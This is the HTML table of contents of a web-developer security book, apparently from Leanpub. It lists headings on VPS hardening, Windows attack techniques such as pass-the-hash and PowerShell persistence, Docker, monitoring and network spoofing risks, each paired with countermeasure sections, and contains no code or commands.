<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>7. VPS</title>
  <link href="stylesheet.css" rel="stylesheet" />
</head>
<body dir="ltr" class="kramdown">
<div id="leanpub-toc">
<h2></h2>
<ol class="toc">
<ul class='toc no-parts'>
  <li>
    <a href='chap00.html#leanpub-auto-foreword'>Foreword</a>
  </li>
  <li>
    <a href='chap01.html#leanpub-auto-preface'>Preface</a>
    <ul>
      <li>
        <a href='chap01.html#leanpub-auto-description'>Description</a>
      </li>
      <li>
        <a href='chap01.html#leanpub-auto-purpose'>Purpose</a>
      </li>
      <li>
        <a href='chap01.html#leanpub-auto-reason'>Reason</a>
      </li>
      <li>
        <a href='chap01.html#leanpub-auto-acknowledgements'>Acknowledgements</a>
      </li>
      <li>
        <a href='chap01.html#leanpub-auto-influences'>Influences</a>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap02.html#leanpub-auto-introduction'>Introduction</a>
  </li>
  <li>
    <a href='chap03.html#vps'>7. VPS</a>
    <ul>
      <li>
        <a href='chap03.html#vps-asset-identification'>1. SSM Asset Identification</a>
      </li>
      <li>
        <a href='chap03.html#leanpub-auto-ssm-identify-risks'>2. SSM Identify Risks</a>
        <ul>
          <li>
            <a href='chap03.html#vps-identify-risks-forfeit-control-thus-security'>Forfeit Control thus Security</a>
          </li>
          <li>
            <a href='chap03.html#vps-identify-risks-Windows'>Windows</a>
            <ul>
              <li>
                <a href='chap03.html#vps-identify-risks-psexec'>PsExec</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-windows-pth-suite-of-metasploit-modules'>Pass The Hash (PTH) suite of Metasploit Modules</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-powershell'>PowerShell</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-powershell-exploitation-via-executable-psmsf'>PowerShell Exploitation via Executable C/- Psmsf</a>
                <ul>
                  <li>
                    <a href='chap03.html#vps-identify-risks-powershell-exploitation-via-executable-psmsf-powershell-payload-creation-details'>PowerShell Payload creation details</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-powershell-exploitation-evolution'>PowerShell Exploitation Evolution</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang'>PowerShell Exploitation via Office Documents C/- Nishang</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-adding-persistence-co-meterpreter'>Adding Persistence C/- Meterpreter</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-adding-persistence-co-powersploit'>Adding Persistence C/- PowerSploit</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-unnecessary-and-vulnerable-services'>Unnecessary and Vulnerable Services</a>
            <ul>
              <li>
                <a href='chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation'>Overly Permissive File Permissions, Ownership and Lack of Segmentation</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-weak-password-strategies'>Weak Password Strategies</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-root-logins'>Root Logins</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ssh'>SSH</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-to-many-boot-options'>To Many Boot Options</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-portmap'>Portmap</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-exim'>EXIM</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-nis'>NIS</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-rpcbind'>Rpcbind</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-telnet'>Telnet</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ftp'>FTP</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-nfs'>NFS</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#vps-identify-risks-lack-of-visibility'>Lack of Visibility</a>
          </li>
          <li>
            <a href='chap03.html#vps-identify-risks-docker'>Docker</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-consumption-from-registrieshttpsdocsdockercomregistry'>Consumption from Registries</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-doppelganger-images'>Doppelganger images</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-docker-the-default-user-is-root'>The Default User is Root</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-docker-host-engine-and-containers'>Docker Host, Engine and Containers</a>
                <ul>
                  <li>
                    <a href='chap03.html#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces'>Namespaces</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-control-groups'>Control Groups</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-capabilities'>Capabilities</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules'>Linux Security Modules (LSM)</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-identify-risks-docker-docker-engine-and-containers-seccomp'>SecComp</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-read-only-containers'>Read-only Containers</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-application-security'>Application Security</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-using-components-with-known-vulnerabilities'>Using Components with Known Vulnerabilities</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-lack-of-backup'>Lack of Backup</a>
          </li>
          <li>
            <a href='chap03.html#vps-identify-risks-lack-of-firewall'>Lack of Firewall</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap03.html#vps-countermeasures'>3. SSM Countermeasures</a>
        <ul>
          <li>
            <a href='chap03.html#vps-countermeasures-forfeit-control-thus-security'>Forfeit Control thus Security</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-windows'>Windows</a>
            <ul>
              <li>
                <a href='chap03.html#vps-countermeasures-psexec-pth'>PsExec and Pass The Hash (PTH)</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-powershell-exploitation-with-persistence'>PowerShell Exploitation with Persistence</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-minimise-attack-surface-by-installing-only-what-you-need'>Minimise Attack Surface by Installing Only what you Need</a>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left'>Disable, Remove Services. Harden what is left</a>
            <ul>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation'>Partitioning on OS Installation</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-apt-proxy-set-up'>Apt Proxy Set-up</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies'>Review Password Strategies</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-considerhttpslistsdebianorgdebian-user201104msg00550html-changing-to-bcrypt'>Consider changing to Bcrypt</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-password-grub'>Password GRUB</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-disable-root-logins-from-all-terminals'>Disable Root Logins from All Terminals</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh'>SSH</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-symmetric-cryptosystems'>Symmetric Cryptosystems</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-asymmetric-cryptosystems'>Asymmetric Cryptosystems</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-hashing'>Hashing</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure'>SSH Connection Procedure</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint'>Establishing your SSH Servers Key Fingerprint</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-hardening-ssh'>Hardening SSH</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-tunneling-ssh'>Tunneling SSH</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-disable-boot-options'>Disable Boot Options</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions'>Lock Down the Mounting of Partitions</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper'>Portmap</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim'>Disable, Remove Exim</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-remove-nis'>Remove NIS</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind'>Rpcbind</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet'>Remove Telnet</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp'>Remove FTP</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs'>NFS</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-lack-of-visibility'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting'>Logging and Alerting</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management'>Web Server Log Management</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-system-loggers-reviewed'>System Loggers Reviewed</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-aims'>Aims</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-environmental-considerations'>Environmental Considerations</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up'>Initial Set-Up</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy'>Improving the Strategy</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring'>Proactive Monitoring</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-evaluation-criteria'>Evaluation Criteria</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals'>Goals</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit'>Sysvinit, Upstart, systemd &amp; Runit</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-forever'>forever</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-pm2httppm2keymetricsio'>PM2</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor'>Supervisor</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit'>Monit</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger'>Passenger</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit'>Getting Started with Monit</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-keep-monit-alive'>Keep Monit Alive</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive'>Keep NodeJS Application Alive</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-statistics-graphing'>Statistics Graphing</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-collectdhttpscollectdorg'>Collectd</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-graphitehttpgraphiteapporg'>Graphite</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-assembling-the-components'>Assembling the Components</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids'>Host Intrusion Detection Systems (HIDS)</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-tripwirehttpspackagesdebianorgstretchtripwire'>Tripwire</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-rkhunterhttpspackagesdebianorgstretchrkhunter'>RkHunter</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-chkrootkithttpspackagesdebianorgstretchchkrootkit'>Chkrootkit</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide'>Unhide</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-ossec'>Ossec</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-stealthhttpsfbb-gitgithubiostealth'>Stealth</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec'>Deeper with Ossec</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth'>Deeper with Stealth</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-outcomes'>Outcomes</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-stealth-up-and-running'>Stealth Up and Running</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-docker'>Docker</a>
            <ul>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-consumption-from-registries'>Consumption from Registries</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-doppelganger-images-1'>Doppelganger images</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-the-default-user-is-root'>The Default User is Root</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers'>Hardening Docker Host, Engine and Containers</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-haskell-dockerfile-linterhttpsgithubcomlukasmartinellihadolint'>Haskell Dockerfile Linter</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-lynishttpscisofycomdownloads'>Lynis</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-docker-benchhttpsgithubcomdockerdocker-bench-security'>Docker Bench</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-coreos-clairhttpsgithubcomcoreosclair'>CoreOS Clair</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-banyanops-collectorhttpsgithubcombanyanopscollector'>Banyanops collector</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-anchorehttpsanchorecomsolutions'>Anchore</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-twistlock'>TwistLock</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-possible-contenders-to-watch'>Possible contenders to watch</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-namespaces'>Namespaces</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups'>Control Groups</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-capabilities'>Capabilities</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-linux-security-modules-lsm'>Linux Security Modules (LSM)</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-seccomp'>Seccomp</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers'>Read-only Containers</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-runc-and-where-it-fits-in'>runC and where it fits in</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-using-runc-standalonehttpsopensourcecomlife168runc-little-container-engine-could'>Using runC Standalone</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-application-security'>Application Security</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-using-components-with-known-vulnerabilities'>Using Components with Known Vulnerabilities</a>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-schedule-backups'>Schedule Backups</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-host-firewall'>Host Firewall</a>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-preparation-for-dmz'>Preparation for DMZ</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-confirm-dmz-has'>Confirm DMZ has</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-additional-web-server-preparation'>Additional Web Server Preparation</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-post-dmz-considerations'>Post DMZ Considerations</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap03.html#vps-risks-that-solution-causes'>4. SSM Risks that Solution Causes</a>
        <ul>
          <li>
            <a href='chap03.html#leanpub-auto-forfeit-control-thus-security'>Forfeit Control thus Security</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-windows-1'>Windows</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-psexec-and-pass-the-hash-pth'>PsExec and Pass The Hash (PTH)</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-powershell-exploitation-with-persistence'>PowerShell Exploitation with Persistence</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-minimise-attack-surface-by-installing-only-what-you-need-1'>Minimise Attack Surface by Installing Only what you Need</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-disable-remove-services-harden-what-is-left'>Disable, Remove Services. Harden what is left</a>
            <ul>
              <li>
                <a href='chap03.html#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-partitioning-on-os-installation'>Partitioning on OS Installation</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-review-password-strategies'>Review Password Strategies</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ssh-1'>SSH</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-disable-boot-options-1'>Disable Boot Options</a>
              </li>
              <li>
                <a href='chap03.html#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-mounting-of-partitions'>Mounting of Partitions</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-portmap'>Portmap</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-exim-1'>Exim</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-remove-nis-1'>Remove NIS</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-rpcbind-1'>Rpcbind</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-telnet'>Telnet</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ftp-1'>FTP</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-nfs-1'>NFS</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-lack-of-visibility'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-logging-and-alerting'>Logging and Alerting</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-web-server-log-management'>Web Server Log Management</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-proactive-monitoring'>Proactive Monitoring</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-statistics-graphing'>Statistics Graphing</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-host-intrusion-detection-systems-hids'>Host Intrusion Detection Systems (HIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-docker'>Docker</a>
            <ul>
              <li>
                <span>&#160;</span>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-linux-security-modules-lsm-1'>Linux Security Modules (LSM)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-schedule-backups'>Schedule Backups</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-host-firewall-1'>Host Firewall</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap03.html#vps-costs-and-trade-offs'>5. SSM Costs and Trade-offs</a>
        <ul>
          <li>
            <a href='chap03.html#leanpub-auto-forfeit-control-thus-security-1'>Forfeit Control thus Security</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-windows-2'>Windows</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-psexec-and-pass-the-hash-pth-1'>PsExec and Pass The Hash (PTH)</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-powershell-exploitation-with-persistence-1'>PowerShell Exploitation with Persistence</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-minimise-attack-surface-by-installing-only-what-you-need-2'>Minimise Attack Surface by Installing Only what you Need</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-disable-remove-services-harden-what-is-left-1'>Disable, Remove Services. Harden what is left</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-partitioning-on-os-installation'>Partitioning on OS Installation</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-review-password-strategies-1'>Review Password Strategies</a>
              </li>
              <li>
                <a href='chap03.html#vps-costs-and-trade-offs-disable-remove-services-harden-what-is-left-ssh'>SSH</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-disable-boot-options-2'>Disable Boot Options</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-mounting-of-partitions'>Mounting of Partitions</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-portmap-1'>Portmap</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-exim-2'>Exim</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-remove-nis-2'>Remove NIS</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-rpcbind-2'>Rpcbind</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-telnet-1'>Telnet</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ftp-2'>FTP</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-nfs-2'>NFS</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-lack-of-visibility-1'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-logging-and-alerting-1'>Logging and Alerting</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-web-server-log-management-1'>Web Server Log Management</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-proactive-monitoring-1'>Proactive Monitoring</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-statistics-graphing-1'>Statistics Graphing</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-host-intrusion-detection-systems-hids-1'>Host Intrusion Detection Systems (HIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-docker-1'>Docker</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-schedule-backups-1'>Schedule Backups</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-host-firewall-2'>Host Firewall</a>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap04.html#network'>8. Network</a>
    <ul>
      <li>
        <a href='chap04.html#leanpub-auto-ssm-asset-identification'>1. SSM Asset Identification</a>
      </li>
      <li>
        <a href='chap04.html#leanpub-auto-ssm-identify-risks-1'>2. SSM Identify Risks</a>
        <ul>
          <li>
            <a href='chap04.html#network-identify-risks-fortress-mentality'>Fortress Mentality</a>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-lack-of-segmentation'>Lack of Segmentation</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-visibility-2'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-insufficient-logging'>Insufficient Logging</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-lack-of-network-intrusion-detection-systems-nids'>Lack of Network Intrusion Detection Systems (NIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-spoofing'>Spoofing</a>
            <ul>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-ip'>IP</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-arp'>ARP (Address Resolution Protocol)</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-dns'>DNS</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-referrer'>Referrer</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-email-address'>EMail Address</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-website'>Website</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-data-exfiltration-infiltration'>Data Exfiltration, Infiltration</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-ingress-and-egress-techniques'>Ingress and Egress Techniques</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-data-exfiltration-infiltration-dropbox'>Dropbox</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-physical'>Physical</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-mobile-phone-data'>Mobile Phone Data</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns-ssh'>DNS, SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-doppelganger-domains'>Doppelganger Domains</a>
            <ul>
              <li>
                <a href='chap04.html#network-identify-risks-doppelganger-domains-websites'>Web-sites</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-doppelganger-domains-smtp'>SMTP</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-doppelganger-domains-ssh'>SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-wrongfully-trusting-the-loading-of-untrusted-web-resources'>Wrongfully Trusting the Loading of Untrusted Web Resources</a>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-tls-downgrade'>TLS Downgrade</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap04.html#network-countermeasures'>3. SSM Countermeasures</a>
        <ul>
          <li>
            <a href='chap04.html#network-countermeasures-fortress-mentality'>Fortress Mentality</a>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-lack-of-segmentation'>Lack of Segmentation</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-visibility-3'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-lack-of-visibility-insufficient-logging'>Insufficient Logging</a>
                <ul>
                  <li>
                    <a href='chap04.html#network-countermeasures-fortress-mentality-insufficient-logging-ntp'>Network Time Protocol (NTP)</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-lack-of-visibility-nids'>Lack of Network Intrusion Detection Systems (NIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-spoofing'>Spoofing</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-ip'>IP</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-arp'>ARP (Address Resolution Protocol)</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-dns'>DNS</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-referrer'>Referrer</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-email-address'>EMail Address</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-website'>Website</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-data-exfiltration-infiltration'>Data Exfiltration, Infiltration</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-dropbox'>Dropbox</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-physical-1'>Physical</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-mobile-phone-data-1'>Mobile Phone Data</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns-ssh-1'>DNS, SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-doppelganger-domains'>Doppelganger Domains</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-doppelganger-domains-websites'>Web-sites</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-doppelganger-domains-smtp'>SMTP</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-doppelganger-domains-ssh'>SSH</a>
